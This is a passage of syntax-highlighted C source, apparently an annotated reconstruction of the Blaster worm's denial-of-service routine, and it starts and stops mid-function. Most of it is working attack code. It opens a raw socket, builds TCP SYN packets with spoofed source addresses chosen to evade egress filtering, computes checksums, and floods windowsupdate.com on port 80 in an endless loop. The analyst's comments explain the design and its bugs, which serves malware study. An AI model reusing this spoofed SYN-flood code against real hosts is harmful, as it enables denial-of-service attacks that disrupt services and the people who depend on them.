</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p_hostent</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SOCKET_ERROR</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0">
</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p_hostent</span><span class="sc10">-&gt;</span><span class="sc11">h_addr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/*
* This thre
*/</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">blaster_DoS_thread</span><span class="sc10">(</span><span class="sc11">LPVOID</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">opt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">target_ip</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc1">/* Lookup the domain-name. Note that no checking is done 
* to ensure that the name is valid. Since Microsoft turned
* this off in their domain-name servers, this function now
* returns -1. */</span><span class="sc0">
</span><span class="sc11">target_ip</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">blaster_resolve_ip</span><span class="sc10">(</span><span class="sc6">"windowsupdate.com"</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc1">/* Create a socket that the worm will blast packets at 
* Microsoft from. This is what is known as a "raw" socket. 
* So-called "raw-sockets" are ones where packets are 
* custom-built by the programmer rather than by the TCP/IP 
* stack. Note that raw-sockets were not available in Windows
* until Win2k. A cybersecurity pundit called Microsoft
* "irresponsible" for adding them. 
* &lt;http://grc.com/dos/sockettome.htm&gt;
* That's probably an
* unfairly harsh judgement (such sockets are available in
* every other OS), but it's true that it puts the power of
* SYNflood attacks in the hands of lame worm writers. While
* the worm-writer would probably have chosen a different
* DoS, such as Slammer-style UDP floods, it's likely that
* Buford wouldn't have been able to create a SYNflood if
* raw-sockets had not been added to Win2k/WinXP. */</span><span class="sc0">
</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">WSASocket</span><span class="sc10">(</span><span class="sc0">
</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc1">/*TCP/IP sockets*/</span><span class="sc0">
</span><span class="sc11">SOCK_RAW</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc1">/*Custom TCP/IP headers*/</span><span class="sc0">
</span><span class="sc11">IPPROTO_RAW</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc11">WSA_FLAG_OVERLAPPED</span><span class="sc0">
</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Tell the raw-socket that IP headers will be created by the
* programmer rather than the stack. Most raw sockets in
* Windows will also have this option set. */</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">setsockopt</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">IPPROTO_IP</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">IP_HDRINCL</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">opt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">opt</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc1">/* Now do the SYN flood. The worm writer decided to flood
* slowly by putting a 20-millisecond delay between packets
* -- causing only 500 packets/second, or roughly, 200-kbps.
* There are a couple of reasons why the hacker may have
* chosen this. 
* 1. SYNfloods are not intended to be bandwidth floods,
* even slow rates are hard to deal with.
* 2. Slammer DoSed both the sender and receiver, therefore
* senders hunted down infected systems and removed
* them. This won't DoS the sender, so people are more
* likely not to care about a few infected machines.
*/</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(;;)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">blaster_send_syn_packet</span><span class="sc10">(</span><span class="sc11">target_ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/* Q: How fast does it send the SYNflood?
* A: About 50 packets/second, where each packet is 
* 320-bits in size, for a total of 15-kbps.
* It means that Buford probably intended for 
* dialup users to be a big source of the DoS
* attack. He was smart enough to realize that 
* faster floods would lead to users discovering
* the worm and turning it off. */</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">20</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc1">/*
* This is a standard TCP/IP checksum algorithm
* that you find all over the web.
*/</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">blaster_checksum</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">bufv</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">bufv</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">*(</span><span class="sc11">buf</span><span class="sc10">++);</span><span class="sc0">
</span><span class="sc11">length</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(*</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">length</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">buf</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xFFFF</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(~</span><span class="sc11">result</span><span class="sc10">)&amp;</span><span class="sc4">0xFFFF</span><span class="sc10">;</span><span class="sc0"> 

</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc1">/*
* This is a function that uses "raw-sockets" in order to send
* a SYNflood at the victim, which is "windowsupdate.com" in 
* the case of the Blaster worm.
*/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">blaster_send_syn_packet</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">target_ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">IPHDR</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">verlen</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*IP version &amp; length */</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">tos</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*IP type of service*/</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">totallength</span><span class="sc10">;</span><span class="sc1">/*Total length*/</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">id</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*Unique identifier */</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*Fragment offset field*/</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ttl</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*Time to live*/</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">protocol</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*Protocol(TCP, UDP, etc.)*/</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">checksum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*IP checksum*/</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">srcaddr</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*Source address*/</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dstaddr</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*Destination address*/</span><span class="sc0">

</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">TCPHDR</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">srcport</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">dstport</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">seqno</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ackno</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">window</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">checksum</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">urgptr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">PSEUDO</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">srcaddr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dstaddr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">padzero</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">protocol</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">tcplength</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">PSEUDOTCP</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">srcaddr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dstaddr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">padzero</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">protocol</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">tcplength</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">TCPHDR</span><span class="sc0"> </span><span class="sc11">tcphdr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">




</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">spoofed_src_ip</span><span class="sc10">[</span><span class="sc4">16</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">target_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">80</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*SYNflood web servers*/</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">to</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">PSEUDO</span><span class="sc0"> </span><span class="sc11">pseudo</span><span class="sc10">;</span><span class="sc0"> 
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">60</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc4">0</span><span class="sc10">};</span><span class="sc0"> 
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">TCPHDR</span><span class="sc0"> </span><span class="sc11">tcp</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">IPHDR</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">source_ip</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc1">/* Yet another randomizer-seeding */</span><span class="sc0">
</span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">

</span><span class="sc1">/* Generate a spoofed source address that is local to the
* current Class B subnet. This is pretty smart of Buford.
* Using just a single IP address allows defenders to turn
* it off on the firewall, whereas choosing a completely
* random IP address would get blocked by egress filters
* (because the source IP would not be in the proper range).
* Randomly choosing nearby IP addresses it probably the 
* best way to evade defenses */</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">spoofed_src_ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%i.%i.%i.%i"</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc11">local_class_a</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">local_class_b</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">255</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">255</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">source_ip</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">blaster_resolve_ip</span><span class="sc10">(</span><span class="sc11">spoofed_src_ip</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc1">/* Build the sockaddr_in structure. Normally, this is what
* the underlying TCP/IP stack uses to build the headers
* from. However, since the DoS attack creates its own
* headers, this step is largely redundent. */</span><span class="sc0">
</span><span class="sc11">to</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">to</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">target_port</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/*this makes no sense */</span><span class="sc0">
</span><span class="sc11">to</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">target_ip</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Create the IP header */</span><span class="sc0">
</span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">verlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x45</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">totallength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tcp</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">id</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">ttl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">128</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">protocol</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPPROTO_TCP</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">checksum</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*for now, set to true value below */</span><span class="sc0">
</span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">dstaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">target_ip</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Create the TCP header */</span><span class="sc0">
</span><span class="sc11">tcp</span><span class="sc10">.</span><span class="sc11">dstport</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">target_port</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">tcp</span><span class="sc10">.</span><span class="sc11">ackno</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">tcp</span><span class="sc10">.</span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">)(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tcp</span><span class="sc10">)&lt;&lt;</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">tcp</span><span class="sc10">.</span><span class="sc11">flags</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*TCP_SYN*/</span><span class="sc0">
</span><span class="sc11">tcp</span><span class="sc10">.</span><span class="sc11">window</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">0x4000</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">tcp</span><span class="sc10">.</span><span class="sc11">urgptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">tcp</span><span class="sc10">.</span><span class="sc11">checksum</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc1">/*for now, set to true value below */</span><span class="sc0">

</span><span class="sc1">/* Create pseudo header (which copies portions of the IP
* header for TCP checksum calculation).*/</span><span class="sc0">
</span><span class="sc11">pseudo</span><span class="sc10">.</span><span class="sc11">dstaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">dstaddr</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">pseudo</span><span class="sc10">.</span><span class="sc11">padzero</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">pseudo</span><span class="sc10">.</span><span class="sc11">protocol</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPPROTO_TCP</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">pseudo</span><span class="sc10">.</span><span class="sc11">tcplength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tcp</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc1">/* Use the source adress chosen above that is close, but
* not the same, as the spreader's IP address */</span><span class="sc0">
</span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">srcaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">source_ip</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Choose a random source port in the range [1000-19999].*/</span><span class="sc0">
</span><span class="sc11">tcp</span><span class="sc10">.</span><span class="sc11">srcport</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">((</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc10">)((</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">1000</span><span class="sc10">)+</span><span class="sc4">1000</span><span class="sc10">));</span><span class="sc0"> 

</span><span class="sc1">/* Choose a random sequence number to start the connection.
* BUG: Buford meant htonl(), not htons(), which means seqno
* will be 15-bits, not 32-bits, i.e. in the range 
* [0-32767]. (the Windows rand() function only returns
* 15-bits). */</span><span class="sc0">
</span><span class="sc11">tcp</span><span class="sc10">.</span><span class="sc11">seqno</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">((</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc10">)((</span><span class="sc11">rand</span><span class="sc10">()&lt;&lt;</span><span class="sc4">16</span><span class="sc10">)|</span><span class="sc11">rand</span><span class="sc10">()));</span><span class="sc0">

</span><span class="sc11">pseudo</span><span class="sc10">.</span><span class="sc11">srcaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">source_ip</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Calculate TCP checksum */</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">pseudo</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">pseudo</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">pseudo</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">tcp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tcp</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">tcp</span><span class="sc10">.</span><span class="sc11">checksum</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">blaster_checksum</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">pseudo</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tcp</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">tcp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tcp</span><span class="sc10">));</span><span class="sc0">

